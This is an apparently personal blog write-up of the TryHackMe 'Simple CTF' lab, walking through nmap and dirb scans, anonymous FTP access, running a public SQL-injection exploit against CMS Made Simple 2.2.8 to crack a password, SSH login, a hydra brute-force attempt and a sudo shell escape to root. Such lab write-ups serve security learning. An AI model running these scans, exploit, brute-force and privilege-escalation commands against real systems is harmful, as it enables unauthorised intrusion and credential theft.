---
title: Simple CTF
categories: [Try-Hack-Me] # Up to two elements only
tags: [tryhackme, easy, simple ctf, ctf, sqli, ftp, dirb]     # TAG names should always be lowercase, infinate number of elements
image: /assets/img/posts/Simple_ctf/Simple_ctf.webp    # If you want to add an image to the top of the post contents
# toc: false    # table of content - overwrite global configuration from _config.yml
# comments: flase       # overwrite global configuration from _config.yml
# pin: true     # pin one or more posts to the top of the home page
excerpt_separator: <!--exc-->
permalink: /:categories/:year/:month/:day/:title:output_ext
published: true
---

This is a writeup for the Simple CTF challenge on Try-Hack-Me where you'll need to scan, exploit SQLi vulnerability and escalate your privileges to root. Rated as Easy/Beginner level machine.
<!--exc-->


# Introduction
In this post, we'll try to root [Simple-CTF](https://tryhackme.com/room/easyctf). It was created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797). It is rated as **Easy/Beginner** level machine.


# Prerequisites
## Kali Linux / Parrot Security OS 
The virtual machine we'll use to source the attack vectors. These Linux disrebutions has all required tools pre-installed. Choose one of them.
* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox 
from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded 
from [https://www.parrotsec.org/download/](https://www.parrotsec.org/download/)

## TryHackMe account
Signup or login to [TryHackMe](https://tryhackme.com/) and deploy the machine.

## Dedicated Directory
We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir`  and `cd` (change directory) into it:

```console
$ mkdir ~/tryhackme/simple_ctf
$ cd ~/tryhackme/simple_ctf/
```


# Scanning
## nmap
We'll start by scanning all ports:

```console
$ sudo nmap -sV -p- -T4 -O -oN nmap 10.10.157.7
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 10:41 EST
Nmap scan report for 10.10.157.7
Host is up (0.081s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.13 seconds
```

## ftp
Personally, if a scan finds a listening FTP service, I ALWAYS try to login using *anonymous* user with empty paswword. Let's do that.

```console
$ ftp 10.10.157.7
Name (10.10.64.49:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Nice! If we use `ls -la` command to list all files in the directory we find an intresting file - `ForMitch.txt`. using `get ForMitch.txt` we can pull that file to our local machine and read it:

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Looks lile we have two potential usernames:
1. Mitch / mitch
2. system / root


## Website
Using Firefox we can check the website on port 80. It looks like a simple Apache default page. Nothing in website headers as well.

We'll run a directory scan using dirb

```console
$ dirb http://10.10.157.7  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jan  9 15:29:03 2021
URL_BASE: http://10.10.157.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------
GENERATED WORDS: 4612                                                          
---- Scanning URL: http://10.10.157.7/ ----
+ http://10.10.157.7/index.html (CODE:200|SIZE:11321)                                               
+ http://10.10.157.7/robots.txt (CODE:200|SIZE:929)                                                 
+ http://10.10.157.7/server-status (CODE:403|SIZE:299)                                             
==> DIRECTORY: http://10.10.157.7/simple/                                                           
---- Entering directory: http://10.10.157.7/simple/ ----
==> DIRECTORY: http://10.10.157.7/simple/admin/                                                     
==> DIRECTORY: http://10.10.157.7/simple/assets/                                                   
==> DIRECTORY: http://10.10.157.7/simple/doc/                                                       
+ http://10.10.157.7/simple/index.php (CODE:200|SIZE:19833)                                         
...
```

dirb found a Simple CMS on `/simple` path. Let's investigate it using Firefox.
The CMS footer is:

> Copyright 2004 - 2021 - CMS Made Simple
> This site is powered by CMS Made Simple version 2.2.8

Quick search in [exploit-db](https://www.exploit-db.com/exploits/46635) reveals the CMS version is **vulnerable to SQLi**.
(You may also use `searchsploit simple 2.2.8` to find that exploit)

We'll download the Python file and run it with `-h` flag to see what arguments we need to provide the script (same can be done if you know your way with Python code but I assume no prior knowledge).
In case you encounter any errors regarding missing packages, use `pip` to install it. Here's a quick [intro to pip](https://docs.python.org/3/installing/index.html#basic-usage)

```console
$ python 46635.py -h
Usage: xpl.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
  -w WORDLIST, --wordlist=WORDLIST
                        Wordlist for crack admin password
  -c, --crack           Crack password with wordlist
```

OK, so our flags are:
* `--url http://10.10.157.7/simple`
* `--crack`
* `--wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt` 

Keep in mind Seclists in not pre-installed in Kali and can be downloaded using `sudo apt install seclists`

This means our full command is:
`python 46635.py --url http://10.10.157.7/simple --crack --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt`. 

The script will run on a dictionary of charectes, trying to find the right one in each place by injecting a special payload. The final output consists of the salt, username, email, hashed password and clear text password:
```console
[+] Salt for password found: [REDUCTED]
[+] Username found: [REDUCTED]
[+] Email found: [REDUCTED]
[+] Password found: [REDUCTED]
[+] Password cracked: [REDUCTED]
```


# Gaining Access
## SSH
Now that we have `username:password` commbination we can try to use and login to SSH (remember the FTP note? it stated the combination is the same):

```
$ ssh mitch@10.10.157.7 -p2222                                                                                                                     130 ⨯
The authenticity of host '[10.10.157.7]:2222 ([10.10.157.7]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.157.7]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.157.7's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```

Success. We now have an active shell. if we list files in that directory using `ls -la`,  we can find the **user flag**.

Using `ls /home` we can list users in the system. This will reveal there's another user on the machine.


# Privilege Escalation
Using `sudo -l` command we can test our user permissions to run services / files with sudo privileges 

Note:
: Links to further reading about `sudo -l` can be found at the Summary

```
$ sudo -l          
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/[REDUCTED]
```

We can use that service to try and spawn a shell with sudo privileges. We first need to lunch the service as `sudo` and try to exit it back to shell. 
`sudo /usr/bin/[REDUCTED]`
Now, once we're in that app we can exit back to shell using `:shell` input, but now as *root*.

Note:
: Links to further reading how to spawn a TTY Shell can be found at the Summary

```
$ root@Machine:~# whoami
root
$ root@Machine:~# cd /root/
$ root@Machine:/root# ls 
root.txt
$ root@Machine:/root# cat root.txt 
[REDUCTED]
```


# Potential Rabbit Holes
## robots.txt
The website's *robots.txt* file contains the following:

```
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

I was positive *mike* is our user and tried looking for more details in the Simple CMS.
Same for the */openemr-5_0_1_3* path, which was not available when I tested. Wasted some time Googling this as well.

## hydra / brute-force
I also tried to Brute-Force *mike*s password on SSH service using Hydra.
`hydra -l system -P /usr/share/wordlists/rockyou.txt ssh://10.10.157.7:2222 -t 4`

## Insuffucient Scanning
Nikto wasn't able to find the Simple CMS and sent me to a goos chase all confused.


# Summary
## Reading Materials
* [How to spawn a TTY Shell](https://netsec.ws/?p=337)
* *sudo -l* - I see this technice used in many CTFs, It's simple to run and easy to understnad. Make sure you feel comfortable with it. [READ](https://www.explainshell.com/explain?cmd=sudo+-l), [READ2](https://medium.com/better-programming/becoming-root-through-misconfigured-sudo-7b68e731d1f5)